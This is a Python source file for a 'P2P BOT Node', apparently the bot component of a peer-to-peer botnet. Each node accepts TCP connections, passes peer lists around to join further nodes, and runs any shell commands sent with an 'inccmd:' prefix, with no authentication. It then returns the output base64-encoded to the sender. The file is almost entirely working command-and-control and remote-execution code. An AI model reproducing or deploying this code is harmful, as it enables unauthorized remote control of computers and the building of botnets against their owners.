#!/usr/bin/env python3

#####################################
### BOT NODE - executing cmd      ###
###          - no input           ###
###          - ?????????          ###
###          - ?????????          ###
###          - ?????????          ###
#####################################
#####################################


import sys
import threading
import socket
import json
import random
import select
import base64
import errno
import time
import os
import subprocess
from dataclasses import dataclass

@dataclass(frozen=True)
class _Const:
    BUFFER_SIZE = 1024
    MAX_CONNECTIONS = 20
    TIME_FORMAT = "%Y-%m-%d %I:%M:%S %p"


class Node:

    def __init__(self, ip: str, port: int) -> None:
        self.__list = []
        self._socket = {
            "id": str(random.randint(10000000, 99999999)),
            "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            "ip": ip,
            "port": port,
            "type": "MASTER"
        }
        self._socket["socket"].setblocking(False)
        self._socket["socket"].setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._tcp_connections = [ self._socket ]
        self._INPUT, self._OUTPUT, self._EXCEPT = [], [], []
        self._EXIT_ON_CMD = False


    def get_socket(self) -> socket.socket:
        return self._socket


    def get_connections(self) -> list:
        return self._tcp_connections


    def set___list(self, newlist: list) -> None:
        self.__list = newlist
        return


    def set_connections(self, connections: list):
        self._tcp_connections = connections
        return


    #
    #
    #
    def init_server(self, c: _Const) -> int:
        try:
            self._socket["socket"].bind((self._socket["ip"], self._socket["port"]))
            self._socket["socket"].listen(c.MAX_CONNECTIONS)
        except socket.error as e:
            print(f"socket error on socket.bind()/socket.listen(): {e.args[::-1]}")
            return 1
        except Exception as e:
            print(f"unexpected error on socket.bind()/socket.listen(): {e.args[::-1]}")
            return 1
        return 0


    #
    # connect to peer
    #
    def connect_to_node(self, ip: str, port: int) -> int:
        target = {
            "id": self._tcp_connections[i]["id"] \
                    for i in range(len(self._tcp_connections)) \
                    if ip == self._tcp_connections[i]["ip"] and port == self._tcp_connections[i]["port"]
        }

        conn_socket = {
            "id": target["id"] if target else str(random.randint(10000000, 99999999)),
            "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            "ip": ip,
            "port": int(port),
            "type": "OUT"
        }

        t = time.strftime("%Y-%m-%d %I:%M:%S %p", time.localtime())

        try:
            for node in range(len(self._tcp_connections)):
                if self._tcp_connections[node]["ip"] == conn_socket["ip"] and self._tcp_connections[node]["port"] == conn_socket["port"]:
                    print(f"{t} :: node {conn_socket['ip']}:{conn_socket['port']} is already connected.")
                    return 1

            conn_socket["socket"].connect((conn_socket["ip"], conn_socket["port"]))

            self._tcp_connections.append(conn_socket)
            self.send_list(target=conn_socket["socket"])

            print(f"{t} :: new connection >>> {conn_socket['ip']}:{conn_socket['port']}")

        except socket.error as e:
            print(f"socket error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
            return 1
        except Exception as e:
            print(f"unexpected error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
            return 1

        return 0


    #
    # send peer list to target
    #
    def send_list(self, target: socket.socket) -> None:
        for i in range(len(self._tcp_connections)):
            ftd = {}
            for key, val in self._tcp_connections[i].items():
                if key == 'socket':
                    continue
                ftd[key] = val
            self.__list.append(ftd)

        # filter nodes => send only OUT & MASTER sockets
        self.__list[:] = (node for node in self.__list if node["type"] != "INC")
        # set new_list flag
        self.__list.insert(0, {"new_list": 1})
        out = json.dumps(self.__list).encode()
        self.__list.clear()
        target.sendall(out)


    #
    #
    #
    def is_socket_closed(self, s: socket.socket) -> bool:
        try:
            # read bytes without blocking and removing them from buffer (peek only)
            data = s.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
            if len(data) == 0:
                return True
        except ConnectionResetError:
            print("socket was closed for some other reason..")
            return True
        except BlockingIOError:
            print("socket is open and reading from it would block..")
            return False
        except socket.error as e:
            # 107 => "Transport endpoint is not connected" => socket normally closed
            if e.errno == 107:
                return True
            print(f"socket-closed check unexpected error: {e.args[::-1]}")
            return False
        return False


    #
    # accept incomming connection | append node to peer list | add socket to stream_input | send new peer list to input thread
    #
    def handle_inc_connection(self, stream_in: list, c = _Const) -> int:
        try:
            sock, addr = self._socket["socket"].accept()
            sock.setblocking(False)
        except socket.error as e:
            if self._EXIT_ON_CMD:
                return 1
            print(f"socket error on socket.accept(): {e.args[::-1]}")
            return -1
        except Exception as e:
            if self._EXIT_ON_CMD:
                return 1
            print(f"unexpected error on socket.accept(): {e.args[::-1]}")
            return -1
        
        target = {
            "id": self._tcp_connections[i]["id"] \
                for i in range(len(self._tcp_connections)) \
                if addr[0] == self._tcp_connections[i]["ip"]
        }

        self._tcp_connections.append({
            "id": target["id"] if target else str(random.randint(10000000, 99999999)),
            "socket": sock,
            "ip": addr[0],
            "port": int(addr[1]),
            "type": "INC"
        })

        stream_in.append(sock)

        t = time.strftime(c.TIME_FORMAT, time.localtime())
        print(f"{t} :: new connection <<< {addr[0]}:{addr[1]}")
        return 0


    #
    # connect to all new peers in list | send new peer list to input thread
    #
    def loop_connect_nodes(self, json_list: list) -> None:
        for node in range(len(json_list)):
            already_connected = False
            # not connecting to self
            if json_list[node]["ip"] == self._socket["ip"] and json_list[node]["port"] == self._socket["port"]:
                continue
            # not connecting to already connected
            for i in range(len(self._tcp_connections)):
                if self._tcp_connections[i]["ip"] == json_list[node]["ip"] and self._tcp_connections[i]["port"] == json_list[node]["port"]:
                    already_connected = True
                    break
            if already_connected:
                continue
            self.connect_to_node(json_list[node]["ip"], json_list[node]["port"])


    #
    # handle recv from stream_select
    #
    def handle_connections(self, c: _Const) -> int:

        stream_in = [ self._socket["socket"] ]
        select_timeout_sec = 3

        while True:
            try:
                self._INPUT, self._OUTPUT, self._EXCEPT = select.select(stream_in, [], [], select_timeout_sec)
            except select.error as e:
                if self._EXIT_ON_CMD:
                    return 1
                print(f"select error on select.socket-select(): {e.args[::-1]}")
                return -1
            except Exception as e:
                if self._EXIT_ON_CMD:
                    return 1
                print(f"unexpected error on select.socket-select(): {e.args[::-1]}")
                return -1

            for s in self._INPUT:
                # new connection
                if s == self._socket["socket"]:
                    inc_conn_res = self.handle_inc_connection(stream_in, c=c)
                    if inc_conn_res != 0:
                        return inc_conn_res
                    continue

                if self.is_socket_closed(s):
                    print(f"socket closed! removing..")
                    self.close_socket(s=s, ssi=stream_in, c=c)
                    continue

                try:
                    inc_data = s.recv(c.BUFFER_SIZE)
                except socket.error as e:
                    print(f"socket error on recv(): {e.args[::-1]}")
                    self.close_socket(s=s, ssi=stream_in, c=c)
                    continue

                if not inc_data:
                    print("empty packet!")
                    self.close_socket(s=s, ssi=stream_in, c=c)
                    continue

                # if inc data is not empty => connection alive
                ip, port = s.getpeername()

                # test if json type => inc new peers list
                try:
                    json_list = json.loads(inc_data)                       
                except Exception as e:
                    json_list = []

                # new_list as flag
                if json_list and not isinstance(json_list, int) and json_list[0].get("new_list") != None and json_list[0]["new_list"] == 1:
                    json_list.pop(0)
                    # connect to nodes in peer list
                    self.loop_connect_nodes(json_list)
                    continue

                if isinstance(inc_data, bytes):
                    inc_data = inc_data.decode().strip()

                if inc_data:
                    if inc_data == "exit:":
                        self.close_socket(s=s, ssi=stream_in, c=c)
                        break
                    elif inc_data[:7] == "inccmd:":
                        cmd = inc_data[7:]
                        print(f">>> incomming command sequence [{cmd}]")
                        # port is not needed as target is searched based upon same IP and "OUT" socket type => node socket pair
                        self.exec_cmd(cmd=cmd, ip=ip, c=c)
                        continue
                
                    t = time.strftime(c.TIME_FORMAT, time.localtime())
                    print(f"{t} :: [{ip}:{port}] :: {inc_data}")

        return 0


    #
    #
    #
    def exec_cmd(self, cmd: str, ip: str, c: _Const) -> int:
        target = {
            "node": self._tcp_connections[node] \
                    for node in range(len(self._tcp_connections)) \
                    if self._tcp_connections[node]["ip"] == ip and self._tcp_connections[node]["type"] == "OUT"
        }
        
        if not target:
            print(f"target {ip} with type \"OUT\" doesn't exist")
            return 1

        cmds = cmd.split(";")
        returned_outputs = []
        
        for cmd in cmds:
            if not cmd:
                continue

            full_cmd = cmd.strip().split(" ")
            print(f"executing command [{full_cmd}]")

            try:
                r = subprocess.check_output(full_cmd)
                returned_outputs.append(r)
            except Exception as e:
                print(f"unexpected error on subprocess.check_output(): {e.args[::-1]}")

        try:
            ret = "\n-----\n".join([str(r) for r in returned_outputs])
            b64ret = "inc-ret-cmd:".encode() + base64.b64encode(ret.encode())

            target["node"]["socket"].send(b64ret)
            
        except socket.error as e:
            print(f"socket error on cmd-ret socket.send(): {e.args[::-1]}")
            self.close_socket(s=target["node"]["socket"], ssi=[], c=c)
            return 1
        except Exception as e:
            print(f"unexpected error on cmd-ret socket.send(): {e.args[::-1]}")
            self.close_socket(s=target["node"]["socket"], ssi=[], c=c)
            return 1
        
        print(f">>> command sequence executed and output sent back to node: {target['node']['ip']}:{target['node']['port']}")
        return 0


    #
    # close socket | remove from lists | re-send new list to stream_in thread
    # ssi => stream-select-inputs list
    #
    def close_socket(self, s: socket.socket, ssi: list, c: _Const) -> None:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except socket.error as e:
            pass
        
        s.close()

        # exiting by request - stream-input as empty array
        if ssi:
            ssi.remove(s)
        for node in range(len(self._tcp_connections)):
            if self._tcp_connections[node]["socket"] == s:

                t = time.strftime(c.TIME_FORMAT, time.localtime())
                socket_direction_type = ">>>" if self._tcp_connections[node]['type'] == "OUT" else "<<<"

                print(f"{t} :: disconnected {socket_direction_type} \
                {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")

                del self._tcp_connections[node]
                break


    #
    # close master socket & clear connections list
    #
    def close_master_socket(self) -> None:
        connections = self._tcp_connections
        t = time.strftime("%Y-%m-%d %I:%M:%S %p", time.localtime())
        for c in connections:
            if c["socket"] == self._socket["socket"]:
                continue
            c["socket"].shutdown(socket.SHUT_RDWR)
            c["socket"].close()
            socket_direction_type = ">>>" if c['type'] == "OUT" else "<<<"
            print(f"{t} :: disconnected {socket_direction_type} {c['ip']}:{c['port']}")
        self.set_connections([])
        self._socket["socket"].shutdown(socket.SHUT_RDWR)
        self._socket["socket"].close()
        print("disconnected all clients..\nmaster socket closed!")



#
#
# read file
def r_file(fpath: str) -> bytes:
    fcontents = b''
    try:
        print(f"PATH: {fpath}")
        with open(fpath, "rb") as f:
            fcontents += f.read()
    except Exception as e:
        print(f"unexpected error on file.read(): {e.args[::-1]}")
        return b''
    return fcontents



#
#
#
def validate_ip_port(ip: str, port: int) -> int:
    # validate ip
    try:
        socket.inet_aton(ip)
    except socket.error as e: 
        print(f"invalid ip address: {e.args[::-1]}")
        return 1
    # validate port
    if 0 < port > 65535:
        print("port number not in range.")
        return 1
    return 0



#
#
#
def main():
    _argc = len(sys.argv)
    # ip:port provided
    if _argc >= 2:
        host = sys.argv[1].split(':')

        if len(host) == 2:
            ip, port = (str(host[0]), int(host[1]))
        else:
            print(f"invalid host (ip:port): {host}")
            exit(1)

        if validate_ip_port(ip, port) != 0:
            print(f"invalid host (ip:port): {host}")
            exit(1)

        # initial target provided
        if _argc == 3:
            rn_0 = sys.argv[2].split(':')
            ip_0, port_0 = (str(rn_0[0]), int(rn_0[1]))
        else:
            ip_0, port_0 = (None, None)

    # no args
    else:
        default_port = 45666
        ip_0, port_0 = (None, None)

        if _argc == 1:
            # assign default host ip & port
            ip, port = (str(socket.gethostbyname(socket.gethostname())), default_port)
            print(f"ip:port not provided >>> using default host ip with default port >>> {ip}:{port}")
        else:
            print("invalid arguments")
            exit(1)

    n = Node(ip, port)
    c = _Const()

    # init node as tcp server
    if n.init_server(c) != 0:
        print("[!] failed to initialize node as server")
        exit(1)

    print(f">>>\n>>> P2P BOT Node {ip}:{port}\n>>>")

    # make initial connection
    if ip_0 and port_0:
        if validate_ip_port(ip_0, port_0) == 0:
            print(f">>> connecting to node-0 [{ip_0}:{port_0}]")
            n.connect_to_node(ip=ip_0, port=port_0)

    ret = n.handle_connections(c)

    if ret == 0:
        print(f"exited normally with [{ret}]")
        n.close_master_socket()
    elif ret == 1:
        print(f"exited by cmd with [{ret}]")
    else:
        print(f"exited with error [{ret}]")
    
    exit(ret)

if __name__ == '__main__':
    main()